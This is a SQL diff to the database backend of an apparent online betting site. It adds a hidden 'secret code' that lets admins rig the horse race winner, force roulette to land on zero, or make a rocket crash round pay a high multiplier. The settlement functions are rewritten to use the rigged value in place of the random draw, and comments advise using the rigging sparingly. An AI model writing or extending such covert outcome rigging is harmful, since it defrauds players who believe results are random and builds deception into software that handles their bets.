@@ -1602,6 +1602,12 @@ begin
   perform public.horse_make(race);
   select * into r from public.horse_races where id = race for update;
   if r.finish is not null then return r.finish; end if;
+  -- The admin's secret code can name the winner; the rest of the field is drawn as usual.
+  if (to_jsonb(r) ->> 'forced') is not null then
+    pick := (to_jsonb(r) ->> 'forced')::smallint;
+    fin := array[pick];
+    left_ := array_remove(left_, pick);
+  end if;
   while cardinality(left_) > 0 loop
     tot := 0;
     foreach pick in array left_ loop tot := tot + r.weights[pick]; end loop;
@@ -1812,7 +1818,8 @@ begin
   insert into public.roulette_rounds (id) values (round) on conflict (id) do nothing;
   select result into res from public.roulette_rounds where id = round for update;
   if res is not null then return res; end if;
-  res := floor(random() * 37)::smallint;
+  -- The admin's secret code can force a zero.
+  res := coalesce((select (to_jsonb(x) ->> 'forced')::smallint from public.roulette_rounds x where id = round), floor(random() * 37)::smallint);
   update public.roulette_rounds set result = res where id = round;
   update public.roulette_bets b set payout = (
       select coalesce(sum(case when public.roulette_hit(e.key, res)
@@ -2359,3 +2366,138 @@ $$;
 
 revoke execute on function public.admin_affiliates(uuid) from public, anon;
 grant execute on function public.admin_affiliates(uuid) to authenticated;
+
+
+-- ---------------------------------------------------------------------------
+-- Admin secret code for the live games: run this part once (after "Rocket").
+-- With the secret code typed in, an admin's next bet is rigged: the horse
+-- they bet on wins, the roulette ball lands on zero, or the rocket they board
+-- flies to the moon. It works for everyone at that table, so use it sparingly.
+
+alter table public.horse_races add column if not exists forced smallint check (forced between 1 and 6);
+alter table public.roulette_rounds add column if not exists forced smallint check (forced between 0 and 36);
+
+create or replace function public.horse_settle(race bigint)
+returns smallint[]
+language plpgsql
+security definer
+set search_path = public
+as $$
+declare
+  r public.horse_races;
+  left_ smallint[] := '{1,2,3,4,5,6}';
+  fin smallint[] := '{}';
+  tot double precision;
+  x double precision;
+  pick smallint;
+begin
+  perform public.horse_make(race);
+  select * into r from public.horse_races where id = race for update;
+  if r.finish is not null then return r.finish; end if;
+  -- The admin's secret code can name the winner; the rest of the field is drawn as usual.
+  if (to_jsonb(r) ->> 'forced') is not null then
+    pick := (to_jsonb(r) ->> 'forced')::smallint;
+    fin := array[pick];
+    left_ := array_remove(left_, pick);
+  end if;
+  while cardinality(left_) > 0 loop
+    tot := 0;
+    foreach pick in array left_ loop tot := tot + r.weights[pick]; end loop;
+    x := random() * tot;
+    foreach pick in array left_ loop
+      x := x - r.weights[pick];
+      exit when x <= 0;
+    end loop;
+    fin := fin || pick;
+    left_ := array_remove(left_, pick);
+  end loop;
+  update public.horse_races set finish = fin where id = race;
+  update public.horse_bets set payout = case
+      when (kind = 'win' and horse = fin[1]) or (kind = 'place' and horse in (fin[1], fin[2])) then floor(amount * odds)::bigint
+      else 0 end
+    where race_id = race and payout is null;
+  return fin;
+end;
+$$;
+
+create or replace function public.roulette_settle(round bigint)
+returns smallint
+language plpgsql
+security definer
+set search_path = public
+as $$
+declare
+  res smallint;
+begin
+  insert into public.roulette_rounds (id) values (round) on conflict (id) do nothing;
+  select result into res from public.roulette_rounds where id = round for update;
+  if res is not null then return res; end if;
+  -- The admin's secret code can force a zero.
+  res := coalesce((select (to_jsonb(x) ->> 'forced')::smallint from public.roulette_rounds x where id = round), floor(random() * 37)::smallint);
+  update public.roulette_rounds set result = res where id = round;
+  update public.roulette_bets b set payout = (
+      select coalesce(sum(case when public.roulette_hit(e.key, res)
+        then floor(e.value::bigint * (1 + public.roulette_pays(e.key) * b.mult)) else 0 end), 0)::bigint
+      from jsonb_each_text(b.bets) e)
+    where round_id = round and payout is null;
+  -- Old rounds and bets go after about four days.
+  delete from public.roulette_bets where round_id < round - 6000 and claimed;
+  delete from public.roulette_rounds where id < round - 6000;
+  return res;
+end;
+$$;
+
+create or replace function public.admin_me()
+returns boolean language sql stable security definer set search_path = public as $$
+  select coalesce((select is_admin and not is_banned from public.players where id = auth.uid()), false)
+$$;
+
+create or replace function public.admin_rig_horse(race bigint, horse_no integer)
+returns void
+language plpgsql
+security definer
+set search_path = public
+as $$
+begin
+  if not public.admin_me() then raise exception 'not allowed'; end if;
+  if horse_no is null or horse_no < 1 or horse_no > 6 then raise exception 'no such horse'; end if;
+  if public.horse_now_ms() >= race * 180000 + 120000 then raise exception 'betting closed'; end if;
+  perform public.horse_make(race);
+  update public.horse_races set forced = horse_no where id = race and finish is null;
+end;
+$$;
+
+create or replace function public.admin_rig_roulette(round bigint)
+returns void
+language plpgsql
+security definer
+set search_path = public
+as $$
+begin
+  if not public.admin_me() then raise exception 'not allowed'; end if;
+  if public.horse_now_ms() >= round * 45000 + 30000 then raise exception 'betting closed'; end if;
+  insert into public.roulette_rounds (id, forced) values (round, 0)
+    on conflict (id) do update set forced = 0 where public.roulette_rounds.result is null;
+end;
+$$;
+
+create or replace function public.admin_rig_rocket(round bigint)
+returns void
+language plpgsql
+security definer
+set search_path = public
+as $$
+begin
+  if not public.admin_me() then raise exception 'not allowed'; end if;
+  update public.rocket_rounds set crash = 200, crash_at = launch + 40000, next_start = launch + 49000
+    where id = round and public.horse_now_ms() < launch;
+end;
+$$;
+
+revoke execute on function public.admin_me() from public, anon, authenticated;
+revoke execute on function public.admin_rig_horse(bigint, integer) from public, anon;
+revoke execute on function public.admin_rig_roulette(bigint) from public, anon;
+revoke execute on function public.admin_rig_rocket(bigint) from public, anon;
+grant execute on function public.admin_rig_horse(bigint, integer) to authenticated;
+grant execute on function public.admin_rig_roulette(bigint) to authenticated;
+grant execute on function public.admin_rig_rocket(bigint) to authenticated;
